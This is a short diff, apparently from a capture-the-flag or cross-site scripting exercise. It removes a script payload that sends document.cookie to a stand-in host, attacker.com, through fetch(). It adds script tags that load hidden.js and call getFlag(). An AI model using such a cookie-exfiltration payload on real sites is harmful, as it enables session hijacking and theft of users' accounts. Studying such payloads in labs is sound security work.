@@ -1,2 +1,5 @@
-%3Cscript%3E
-<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<script src="hidden.js">
+        getFlag();
+    </script>
+<script src="hidden.js"></script>
+    <script>getFlag();</script>
